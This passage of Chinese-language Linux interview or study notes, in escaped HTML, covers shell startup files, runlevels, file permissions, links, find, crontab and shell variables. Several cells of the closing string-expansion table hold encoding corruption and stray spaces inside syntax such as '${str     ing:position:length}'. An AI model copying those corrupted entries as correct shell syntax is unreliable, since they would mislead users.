  &lt;li&gt;&lt;strong&gt;进入 login shell&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;命令行登录：首先读入 /etc/profile，这是对所有用户都有效的配置；然后依次寻找下面三个文件，这是针对当前用户的配置。
&lt;code&gt;~/.bash_profile&lt;/code&gt; &lt;code&gt;~/.bash_login&lt;/code&gt; &lt;code&gt;~/.profile&lt;/code&gt; 需要注意的是，这三个文件只要有一个存在，就不再读入后面的文件了。比如，要是 ~/.bash_profile 存在，就不会再读入后面两个文件了。&lt;/li&gt;
    &lt;li&gt;ssh登录：与第一种情况完全相同。&lt;/li&gt;
    &lt;li&gt;图形界面登录：只加载 /etc/profile 和 ~/.profile。也就是说，~/.bash_profile 不管有没有，都不会运行。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;打开 non-login shell&lt;/strong&gt; 用户进入操作系统以后，常常会再手动开启一个shell。这个shell就叫做 non-login shell，意思是它不同于登录时出现的那个shell，不读取/etc/profile和.profile等配置文件。它会读入用户自己的bash配置文件 ~/.bashrc。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;linux中的运行级别是怎么回事怎样切换运行级别&quot;&gt;Linux中的运行级别是怎么回事？怎样切换运行级别？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;运行级别 定义了在 Linux 系统的目前状态（或运行级别）下能够完成哪些任务。每个 Linux 系统支持三种基本的运行级别，以及完成正常操作所需的一个或多个运行级别。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux 的基本运行级别&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;级别&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;目的&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;关闭（或停止）系统&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;单用户模式；通常别称为 s 或 S&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;重启系统&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;其他常见的 Linux 运行级别&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;级别&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;目的&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;没有联网的多用户模式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;联网的多用户模式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;联网并且使用 X Window 系统的多用户模式&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;在启动 Linux 系统时，默认的运行级别是由 /etc/inittab 中的 id: 条目确定的。&lt;br /&gt;
无需重启系统，可以使用 &lt;code&gt;telinit&lt;/code&gt; 命令转到另一个运行级别，使用 &lt;code&gt;runlevel&lt;/code&gt; 命令来显示之前的运行级别和现在的运行级别。如果第一个输出参数是 ‘N’，那么在启动系统之后，运行级别就不会发生改变。
telinit 实际上是 init 的一个符号链接 &lt;code&gt;ls -l $(which telinit)&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;超级管理员的密码忘记了怎么办&quot;&gt;超级管理员的密码忘记了怎么办？&lt;/h2&gt;

&lt;p&gt;从GRUB界面在引导装载程序进入单用户模式，修改root密码&lt;/p&gt;

&lt;h2 id=&quot;怎样让一个命令在linux启动时自动执行&quot;&gt;怎样让一个命令在Linux启动时自动执行？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code&gt;ln -s&lt;/code&gt; 建立启动软连接 /etc/rc.d/rc[0~6].d 每个目录分别存放着对应运行级别加载时需要关闭或启动的服务，K开头的脚本文件代表运行级别加载时需要关闭的，S开头的代表需要执行，将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;chkconfig&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;ntsysv &lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;linux中的文件权限是怎样设定的文件和目录各有哪些可设置的权限&quot;&gt;Linux中的文件权限是怎样设定的？文件和目录各有哪些可设置的权限？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;用户和组&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linux 是一个多用户的系统，每个用户属于一个主要 组，也可能是附加组。也可以作为一个用户登录，然后使用 su 或者 sudo -s 命令变为另一个用户。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;whoami&lt;/code&gt; 检查您当前有效的 用户id&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;groups&lt;/code&gt; 命令找出在什么组中：&lt;code&gt;groups&lt;/code&gt; &lt;code&gt;groups root&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;id&lt;/code&gt; 找出用户和组信息 &lt;code&gt;id&lt;/code&gt; &lt;code&gt;id root&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;文件所有权和权限&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;普通文件 Linux 权限模型每个文件系统对象有 3 种类型。这些权限就是读（r），写（w）和执行（x）。写权限包括修改和删除对象的能力。此外，这些权限被分别指定给文件所有者、文件组成员和其他人。&lt;/li&gt;
  &lt;li&gt;目录 目录的读权限允许用户使用该权限列出目录内容。写权限意味着用户使用该权限能够在目录中创建或者删除文件。执行权限允许用户输入目录并访问任意子目录。没有执行权限，目录下的文件系统对象就是不可访问的。没有读权限，目录下的文件系统对象在目录清单下就是不可见的，但是如果知道磁盘上对象的完整路径，这些对象仍是可访问的。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是软链接什么是硬链接他们有什么作用&quot;&gt;什么是软链接？什么是硬链接？他们有什么作用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;硬链接与软链接是 Linux 文件系统中的一个重要概念，其涉及文件系统中的索引节点 (index node 又称 inode)，而索引节点对象是 Linux 虚拟文件系统 (VFS) 的四个基本概念之一。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;为解决文件的共享使用，Linux 系统引入了两种链接：硬链接 (hard link) 与软链接（又称符号链接，即 soft link 或 symbolic link）。链接为 Linux 系统解决了文件的共享使用，还带来了隐藏文件路径、增加权限安全及节省存储等好处。若一个 inode 号对应多个文件名，则称这些文件为硬链接。换言之，硬链接就是同一个文件使用了多个别名（见 图 2.hard link 就是 file 的一个别名，他们有共同的 inode）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;文件有相同的 inode 及 data block；&lt;/li&gt;
  &lt;li&gt;只能对已存在的文件进行创建；&lt;/li&gt;
  &lt;li&gt;不能交叉文件系统进行硬链接的创建；&lt;/li&gt;
  &lt;li&gt;不能对目录进行创建，只可对文件创建；&lt;/li&gt;
  &lt;li&gt;删除一个硬链接文件并不影响其他有相同 inode 号的文件。&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;软链接与硬链接不同，若文件用户数据块中存放的内容是另一文件的路径名的指向，则该文件就是软连接。软链接就是一个普通文件，只是数据块内容有点特殊。软链接有着自己的 inode 号以及用户数据块（见 图 2.）。因此软链接的创建与使用没有类似硬链接的诸多限制：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;软链接有自己的文件属性及权限等；&lt;/li&gt;
  &lt;li&gt;可对不存在的文件或目录创建软链接；&lt;/li&gt;
  &lt;li&gt;软链接可交叉文件系统；&lt;/li&gt;
  &lt;li&gt;软链接可对文件或目录创建；&lt;/li&gt;
  &lt;li&gt;创建软链接时，链接计数 i_nlink 不会增加；&lt;/li&gt;
  &lt;li&gt;删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接被称为死链接（即 dangling link，若被指向路径文件被重新创建，死链接可恢复为正常的软链接）。&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;linux日常使用&quot;&gt;Linux日常使用&lt;/h1&gt;

&lt;h2 id=&quot;linux中的小工具忘记了参数怎么办怎么样获取帮助&quot;&gt;Linux中的小工具忘记了参数怎么办？怎么样获取帮助？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;man&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;--help&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;-h&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;linux中怎样查找文件怎么在文件中查找特定的内容&quot;&gt;Linux中怎样查找文件？怎么在文件中查找特定的内容？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;$ find &amp;lt;指定目录&amp;gt; &amp;lt;指定条件&amp;gt; &amp;lt;指定动作&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;locate&lt;/code&gt;命令其实是&lt;code&gt;find -name&lt;/code&gt;的另一种写法，但是要比后者快得多，原因在于它不搜索具体目录，而是搜索一个数据库（/var/lib/locatedb），这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，所以使用locate命令查不到最新变动过的文件。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;whereis&lt;/code&gt;命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;which&lt;/code&gt;命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;type&lt;/code&gt;命令其实不能算查找命令，它是用来区分某个命令到底是由shell自带的，还是由shell外部的独立二进制文件提供的。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Find&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;基本格式&lt;/p&gt;

&lt;p&gt;&lt;code&gt;find [-H] [-L] [-P] [path...] [expression]&lt;/code&gt;\&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;find&lt;/code&gt; will display the pathnames of all files in the current directory and all subdirectories.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;find / -name foo 2&amp;gt;/dev/null&lt;/code&gt; find command using a search criterion and the default action&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;find /tmp /var/tmp . $HOME -name foo&lt;/code&gt; You can specify as many places to search as you wish&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;find downloads  -iname &quot;*.gif&quot;&lt;/code&gt; 不区分大小写&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按类型查找&lt;/p&gt;

&lt;p&gt;&lt;code&gt;find /usr -type l&lt;/code&gt; 查找某一类型的文件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;b - 块设备文件&lt;/li&gt;
  &lt;li&gt;d - 目录&lt;/li&gt;
  &lt;li&gt;c - 字符设备文件&lt;/li&gt;
  &lt;li&gt;p - 管道文件&lt;/li&gt;
  &lt;li&gt;l - 符号链接文件&lt;/li&gt;
  &lt;li&gt;f - 普通文件。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按时间查找&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mtime — 文件内容上次修改时间&lt;/li&gt;
  &lt;li&gt;atime — 文件被读取或访问的时间&lt;/li&gt;
  &lt;li&gt;ctime — 文件状态变化时间&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些时间选项都需要与一个值 n 结合使用，指定为 -n、n 或 +n。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-n 返回项小于 n&lt;/li&gt;
  &lt;li&gt;+n 返回项大于 n&lt;/li&gt;
  &lt;li&gt;n 返回项正好与 n 相等&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还可以使用 -newer、-anewer 和 –cnewer 选项查找已修改或访问过的文件与特定的文件比较。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-newer 指内容最近被修改的文件&lt;/li&gt;
  &lt;li&gt;-anewer 指最近被读取过的文件&lt;/li&gt;
  &lt;li&gt;-cnewer 指状态最近发生变化的文件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按大小查找 [cwbkMG]&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-size n&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;-size +n&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;-size -n&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;find / -size  +5000000c 2&amp;gt; /dev/null&lt;/code&gt;\&lt;/p&gt;

&lt;p&gt;按权限查找&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;-perm model&lt;/code&gt; File’s  permission  bits  are exactly mode.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;-perm -mode&lt;/code&gt; All of the permission bits mode are  set  for  the  file.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;-perm /mode&lt;/code&gt; Any  of the permission bits mode are set for the file.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;-perm +mode&lt;/code&gt; Deprecated&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code&gt;-executable&lt;/code&gt; Matches files which are executable and directories which are searchable (in a file name resolution sense).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;find /sbin /usr/sbin -executable \! -readable -print&lt;/code&gt;
&lt;code&gt;find . -perm 664&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;控制find&lt;/p&gt;

&lt;p&gt;&lt;code&gt;find -maxdepth 2 -name passwd&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;linux中有哪些用于处理文本的小工具怎样通过管道组合起来使用&quot;&gt;Linux中有哪些用于处理文本的小工具？怎样通过管道组合起来使用？&lt;/h2&gt;

&lt;p&gt;find 文件查找
grep 文本搜索
xargs 命令行参数转换
sort 排序
uniq 消除重复行
用tr进行转换
cut 按列切分文本
paste 按列拼接文本
wc 统计行和字符的工具
sed 文本替换利器
awk 数据流处理工具&lt;/p&gt;

&lt;h2 id=&quot;怎么样使用文本工具对日志进行统计分析&quot;&gt;怎么样使用文本工具对日志进行统计分析&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;awk '{a[$1]+=1;}END{for(i in a){print a[i]&quot; &quot; i;}}' averainy.info.log&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;211.154.151.111 - - [03/May/2012:05:02:01 +0800] GET /feed HTTP/1.1 200 73777 - Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;) -&lt;/p&gt;

&lt;h2 id=&quot;输入输出重定向是怎么回事&quot;&gt;输入，输出重定向是怎么回事？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓I/O重定向简单来说就是一个过程，这个过程捕捉一个文件，或者命令，程序，脚本，甚至脚本中的代码块（code block）的输出，然后把捕捉到的输出，作为输入发送给另外一个文件，命令，程序，或者脚本。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果谈到I/O重定向，就涉及到文件标识符(File Descriptor)的概念, 在Linux系统中，系统为每一个打开的文件指定一个文件标识符以便系统对文件进行跟踪，这里有些和C语言编程里的文件句柄相似，文件标识符是一个数字，不同数字代表不同的含义，默认情况下，系统占用了3个，分别是0标准输入（stdin）,1标准输出(stdout), 2标准错误(stderr), 另外3-9是保留的标识符，可以把这些标识符指定成标准输入，输出或者错误作为临时连接。通常这样可以解决很多复杂的重定向请求。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;标准输入通常指键盘的输入&lt;/li&gt;
  &lt;li&gt;标准输出通常指显示器的输出&lt;/li&gt;
  &lt;li&gt;标准错误通常也是定向到显示器&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vim编辑器怎样使用&quot;&gt;VIm编辑器怎样使用？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;linux系统管理&quot;&gt;Linux系统管理&lt;/h1&gt;

&lt;h2 id=&quot;linux中有哪些安装软件的方式怎样实现编译安装&quot;&gt;Linux中有哪些安装软件的方式？怎样实现编译安装？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;deb是Debian软件包格式，文件扩展名为.deb，跟Debian的命名一样，deb也是因Debra Murdock（Debian创始人Ian Murdock的前妻）而得名。
Debian包是Unixar的标准归档，将包文件信息以及包内容，经过gzip和tar打包而成。
处理这些包的经典程序是dpkg，经常是通过apt来运作。
通过Alien工具，可以将deb包转换成其他形式的软件包。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;RPM包管理员（简称RPM，全称为The RPM Package Manager）是在Linux下广泛使用的软件包管理器。RPM此名词可能是指.rpm的文件格式的软件包，也可能是指其本身的软件包管理器(RPM Package Manager)。
RPM软件包分为二进制包（Binary）、源代码包（Source）和Delta包三种。二进制包可以直接安装在计算机中，而源代码包将会由RPM自动编译、安装。源代码包经常以src.rpm作为后缀名。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;管理deb软件包的dpkg以及它的前端apt（使用于Debian、Ubuntu）。 rpm以及它的前端yum（使用于Fedora）、前端ZYpp（使用于openSUSE）、 前端urpmi（使用于Mandriva Linux、Mageia）等&lt;/p&gt;

&lt;h2 id=&quot;怎样启动停止重启一个系统服务&quot;&gt;怎样启动，停止，重启一个系统服务？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;sudo service mysql restart&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;怎样查看当前系统中登录了哪些用户&quot;&gt;怎样查看当前系统中登录了哪些用户？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;w&lt;/code&gt;
&lt;code&gt;who&lt;/code&gt;
&lt;code&gt;last&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;怎样查看当前系统的负载情况怎样确定系统是否已经满负荷&quot;&gt;怎样查看当前系统的负载情况？怎样确定系统是否已经满负荷？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;top&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;怎样使一个命令在每周一三五早8点-10点每隔五分钟执行一次&quot;&gt;怎样使一个命令在每周一三五早8点-10点每隔五分钟执行一次？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;crontab文件包含送交cron守护进程的一系列作业和指令。每个用户可以拥有自己的crontab文件；同时，操作系统保存一个针对整个系统的crontab文件，该文件通常存放于/etc或者/etc之下的子目录中，而这个文件只能由系统管理员来修改。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;crontab文件的每一行均遵守特定的格式，由空格或tab分隔为数个领域，每个领域可以放置单一或多个数值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;操作符号&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;逗号 (‘,’) 分开的值，例如：“1,3,4,7,8”&lt;/li&gt;
  &lt;li&gt;连词符 (‘-‘) 制定值的范围，例如：“1-6”，意思等同于“1,2,3,4,5,6”&lt;/li&gt;
  &lt;li&gt;星号 (‘*’) 代表任何可能的值。例如，在“小时域” 里的星号等于是“每一个小时”，等等&lt;/li&gt;
  &lt;li&gt;某些cron程序的扩展版本也支持斜线 (‘/’) 操作符，用于表示跳过某些给定的数。例如，“*/3”在小时域中等于“0,3,6,9,12,15,18,21”等被3整除的数；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;时间设置&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 文件格式说明
#  ——分钟 (0 - 59)
# |  ——小时 (0 - 23)
# | |  ——日   (1 - 31)
# | | |  ——月   (1 - 12)
# | | | |  ——星期 (0 - 7)（星期日=0或7）
# | | | | |
# * * * * * 被执行的命令
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;常见错误&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;命令行双引号中使用&lt;code&gt;%&lt;/code&gt;时，未加反斜线&lt;code&gt;\&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;与其他域不同，第三和第五个域之间执行的是“或”操作。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;crontab -e&lt;/code&gt;
*/5 8-10 * * 1,3,5 command&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;shell编程&quot;&gt;Shell编程&lt;/h1&gt;

&lt;h2 id=&quot;什么是shell&quot;&gt;什么是Shell？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;壳层在计算机科学中，是指“提供用户使用界面”的软件，通常指的是命令行界面的解析器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;shell是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shell is a user program or it’s environment provided for user interaction. Shell is an command language interpreter that executes commands read from the standard input device (keyboard) or from a file.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是shell脚本怎样让一个脚本文件变成一个可以直接执行的软件&quot;&gt;什么是Shell脚本？怎样让一个脚本文件变成一个可以直接执行的软件？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Shell Script is series of command written in plain text file. Shell script is just like batch file is MS-DOS but have more power than the MS-DOS batch file.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在第一行指定脚本解释器，如：&lt;code&gt;#!/bin/sh&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;怎样定义shell变量&quot;&gt;怎样定义Shell变量？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;shell变量是一种很“弱”的变量，默认情况下，一个变量保存一个串，shell不关心这个串是什么含义。所以若要进行数学运算，必须使用一些命令例如let、declare、expr、双括号等。shell变量可分为两类：局部变量和环境变量。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;var=value&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;export var&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;$0  获取当前执行的shell脚本的文件名&lt;/li&gt;
  &lt;li&gt;$n  获取当前执行的shell脚本的第n个参数值，n=1..9&lt;/li&gt;
  &lt;li&gt;$*  获取当前shell的所有参数 “$1 $2 $3 …注意与$#的区别&lt;/li&gt;
  &lt;li&gt;$#  获取当前shell命令行中参数的总个数&lt;/li&gt;
  &lt;li&gt;$$  获取当前shell的进程号（PID）&lt;/li&gt;
  &lt;li&gt;$!  执行上一个指令的PID&lt;/li&gt;
  &lt;li&gt;$?  获取执行的上一个指令的返回值(0 为成功， 非零为失败)&lt;/li&gt;
  &lt;li&gt;$@  这个程序的所有参数 “$1″ “$2″ “$3″ “…”&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;怎样给一个shell脚本传递命令参数怎样接受解析这些参数&quot;&gt;怎样给一个Shell脚本传递命令参数？怎样接受，解析这些参数？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;位置参数 $0就是脚本文件的名字,$1是第一个参数,$2为第2个…,$9以后就需要打括号了,如${10},${11},${12}…&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;shell中怎样捕获一个命令的输出结果&quot;&gt;Shell中怎样捕获一个命令的输出结果？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;var=`ps -ef | grep oracle`
var=$(ps -ef | grep oracle)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;命令的返回码是什么东西有什么用怎样查看&quot;&gt;命令的返回码是什么东西？有什么用？怎样查看？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;echo $?&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;怎样定义shell函数函数怎样传递参数怎样返回数值&quot;&gt;怎样定义Shell函数？函数怎样传递参数？怎样返回数值？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;[ function ] funname [()]
{
  action;
  [return int;]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;shell中怎样进行数学计算&quot;&gt;Shell中怎样进行数学计算？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;var=1&lt;/code&gt;\&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;let &quot;var+=1&quot;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;((var+=1))&lt;/li&gt;
  &lt;li&gt;$[$var+1]&lt;/li&gt;
  &lt;li&gt;var=&lt;code&gt;expr $var+1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;var=&lt;code&gt;echo &quot;$var+1&quot;|bc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;shell中怎样处理字符串&quot;&gt;Shell中怎样处理字符串？&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;表达式&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;含义&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${#string}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;$string的长度&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string:position}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;在$string中, 从位置$position开始提取子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${str     ing:position:length}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;在$string中, 从位置$position开始提取长å¦为$length的子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string#substring}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;从变量$string的开头, 删  除最短匹配$substring的子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string##substring}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;从变量$strin  g的开头, 删除最长匹配$substring的子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string%substring}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;从变量$string的结尾, 删除最短匹配$substring的子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string%%substring}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;从变量$string的结尾, 删除最长匹配$substringç子串&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string/substring/replacement}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;使用$replacement, 来代替ç¬一个匹配的$substring&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string//substring/replacement}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;使用$rep  lacement, 代替所有匹配的$substring&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string/#substring/replacement}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;如果$string的前缀匹配$substring, 那么就用$replacement来ä£替匹配到的$substring&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;${string/%substring/replacement}&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;如果$stri ng的后缀匹配$substring, 那么就用$replacement来代替匹配到的$substring&lt;/td&gt;
